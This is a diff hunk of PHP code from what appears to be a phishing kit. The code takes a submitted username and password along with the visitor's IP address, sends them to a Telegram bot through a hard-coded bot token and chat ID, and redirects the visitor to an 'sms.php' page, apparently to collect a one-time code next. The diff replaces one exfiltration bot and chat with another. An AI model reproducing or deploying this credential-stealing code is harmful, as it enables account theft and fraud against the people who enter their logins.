@@ -62,7 +62,7 @@ if(!empty($_POST["username"]) && !empty($_POST["password"])){
     $message .= " IP        : ".$_SERVER['REMOTE_ADDR'].""."n";
     $message .= "----------------------NICKEL------------------------"."n";
 
-    file_get_contents("https://api.telegram.org/bot8443989182:AAGxL1BFEBth_NSqxapGsTjRqLrR5f1nPn0/sendMessage?chat_id=-4826304900&text=".urlencode($message));
+    file_get_contents("https://api.telegram.org/bot8712281940:AAGvbS6l8Aoyz-vaxKV79Kw1wGVeQNUBf3k/sendMessage?chat_id=-1003785770729&text=".urlencode($message));
 
     header ("location:sms.php");
 
